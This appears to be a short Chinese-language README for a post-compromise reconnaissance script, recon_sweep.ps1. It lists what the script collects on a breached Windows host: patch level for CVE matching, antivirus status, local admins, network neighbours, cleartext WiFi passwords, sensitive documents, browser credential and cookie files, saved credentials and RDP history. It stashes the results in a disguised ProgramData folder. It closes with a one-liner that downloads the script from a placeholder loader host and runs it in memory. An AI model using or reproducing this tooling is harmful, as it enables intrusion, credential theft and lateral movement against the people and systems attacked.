# 落地侦察

`recon_sweep.ps1` 落地即采集并落盘到 `C:\ProgramData\SysCache\recon_<host>_<ts>.txt`：

- 主机/系统/补丁水位（含 UBR，可直接对 CVE 表判断能否利用）
- 杀软状态（Defender/第三方）
- SMB 配置（SMB1、签名、匿名）
- 本地用户/管理员组成员
- IPv4/IPv6/路由/ARP/已建连接（找相邻主机与网段）
- **WiFi 明文密码**（netsh key=clear）
- 桌面/文档/下载/备份盘的文档清单（doc/xls/pdf/zip/kdbx/pst）
- 浏览器凭据文件存在性（Chrome/Edge/360 的 Login Data、Cookies、History）
- cmdkey 保存凭据、mstsc 连接历史

```powershell
irm http://LOADER_IP:8090/recon/recon_sweep.ps1 | iex
```
